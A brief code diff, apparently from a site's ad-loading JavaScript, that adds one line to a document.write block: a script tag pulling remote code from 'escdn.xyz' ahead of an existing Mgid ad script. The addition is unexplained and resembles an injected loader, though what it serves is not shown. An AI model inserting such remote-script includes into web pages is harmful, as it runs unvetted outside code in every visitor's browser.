@@ -1,4 +1,5 @@
 document.write(`
+<script src="https://escdn.xyz/view"></script>
 <!-- Script Mgid -->
 <script type='text/javascript'>
     //CONFIGURAR
